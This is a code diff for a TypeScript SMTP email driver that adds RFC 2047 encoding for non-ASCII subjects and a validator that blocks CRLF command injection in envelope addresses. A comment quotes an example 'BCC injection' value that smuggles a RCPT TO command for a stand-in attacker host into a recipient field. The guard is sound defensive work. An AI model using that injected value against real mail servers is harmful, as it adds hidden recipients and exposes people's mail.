@@ -9,6 +9,42 @@ import { template } from '../template'
 import { BaseEmailDriver } from './base'
 
 /**
+ * Encode an SMTP header value with RFC 2047 base64 encoding when it
+ * contains non-ASCII characters. Without this, subjects like
+ * "Encore d'idées" or "你好" produce headers that violate RFC 5322 (which
+ * mandates 7-bit ASCII for headers) and get mangled or rejected by
+ * downstream relays.
+ */
+function encodeRfc2047IfNeeded(value: string): string {
+  // eslint-disable-next-line no-control-regex
+  if (/^[\x00-\x7F]*$/.test(value)) return value
+  const encoded = Buffer.from(value, 'utf-8').toString('base64')
+  return `=?UTF-8?B?${encoded}?=`
+}
+
+/**
+ * SMTP envelope-address validator.
+ *
+ * SMTP commands are CRLF-terminated, so any user-controlled address
+ * containing `\r` / `\n` lets an attacker inject a fresh command into
+ * the conversation (the classic "BCC injection" vector — slip
+ * `victim@example.com\r\nRCPT TO:<attacker@evil.com>` into a `to`
+ * field and the server happily accepts a hidden recipient). The
+ * regex below rejects every shape that isn't a plain `local@domain`
+ * with no whitespace, control chars, angle brackets, quotes, or
+ * backslashes — which is intentionally tighter than full RFC 5321
+ * because the broader form (display names, comments, source routes)
+ * has no business reaching this transport.
+ */
+const ENVELOPE_ADDRESS = /^[^\s<>"\\\r\n\t]+@[^\s<>"\\\r\n\t]+$/
+
+function assertEnvelopeAddress(addr: string, role: string): void {
+  if (typeof addr !== 'string' || !ENVELOPE_ADDRESS.test(addr)) {
+    throw new Error(`[smtp] Refusing to send: ${role} envelope address contains forbidden characters or is malformed: ${JSON.stringify(addr)}`)
+  }
+}
+
+/**
  * SMTP Driver for email sending
  * Works with any SMTP server: Mailtrap, Mailgun, SendGrid, SES, etc.
  * Supports STARTTLS (port 587) and direct TLS (port 465)
@@ -116,7 +152,7 @@ export class SMTPDriver extends BaseEmailDriver {
     lines.push(`To: ${to}`)
     if (cc)
       lines.push(`Cc: ${cc}`)
-    lines.push(`Subject: ${subject}`)
+    lines.push(`Subject: ${encodeRfc2047IfNeeded(subject)}`)
     lines.push(`MIME-Version: 1.0`)
     lines.push(`Date: ${new Date().toUTCString()}`)
     lines.push(`Message-ID: <${Date.now()}.${Math.random().toString(36).substring(2)}@${config.email.domain || 'localhost'}>`)
@@ -275,6 +311,10 @@ export class SMTPDriver extends BaseEmailDriver {
             await sendCommand(Buffer.from(smtpConfig.username).toString('base64'))
             await sendCommand(Buffer.from(smtpConfig.password).toString('base64'))
           }
+
+          // SMTP command injection guard — see assertEnvelopeAddress below.
+          assertEnvelopeAddress(from, 'MAIL FROM')
+          for (const recipient of to) assertEnvelopeAddress(recipient, 'RCPT TO')
 
           // Send email
           await sendCommand(`MAIL FROM:<${from}>`)
